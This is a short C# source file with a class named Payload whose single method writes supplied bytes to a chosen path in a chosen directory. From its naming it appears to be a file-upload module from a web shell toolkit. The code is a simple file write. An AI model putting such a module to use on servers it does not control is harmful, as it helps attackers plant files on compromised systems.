using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;

public class Payload
{
    public string Run()
    {
        string ret = "0";
        Directory.SetCurrentDirectory(Global.pwd);
        File.WriteAllBytes(Global.path, Global.data);
        ret = "1";
        return ret;
    }
}